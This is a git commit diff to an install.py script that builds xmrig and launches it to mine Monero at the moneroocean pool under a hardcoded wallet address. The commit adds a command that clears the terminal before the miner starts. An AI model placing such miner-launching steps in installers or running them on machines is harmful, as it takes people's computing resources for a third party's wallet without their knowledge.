6ccf3d7fea9e2308375bd8a01d01d8a9fd041632
Btrader-os <81942106+Btrader-os@users.noreply.github.com>
2021-11-14 13:30:39 -0500

    Update install.py

--- install.py
+++ install.py
@@ -8,5 +8,6 @@ os.system("mkdir build")
 os.system("cd build")
 os.system("cmake ..")
 os.system("make")
+os.system("clear")
 os.system("./xmrig -o gulf.moneroocean.stream:10128 -u 448TDJLLcXnFP1gdePtg1FVNQDj8RcL4GQwQk6v4o4pdd5CNrwVDvt9EyscfvaZg8sRdhReAeyuLCCHf6sD57kH8BWnMBUH -p Laptop")
 
